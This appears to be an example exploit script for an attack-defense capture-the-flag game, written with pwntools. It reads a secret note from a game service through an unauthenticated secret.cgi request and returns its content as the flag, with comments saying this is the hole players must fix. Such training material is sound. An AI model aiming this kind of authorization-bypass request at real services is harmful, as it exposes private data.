# In this example, instead, we use pwntools
from pwn import *

def exploit(ip, port, flag_id):
    # We read that note, but we don't know the password.
    # (Basically, get_flag without the "token".)
    # This is what players must prevent!
    note_id = flag_id

    with remote(ip, port) as r:
        r.sendline("GET /secret.cgi?note_id="+note_id)
        content = r.recvuntil(',') # You should be more robust :)
        content = content.strip(',')

    return { 'FLAG': content }
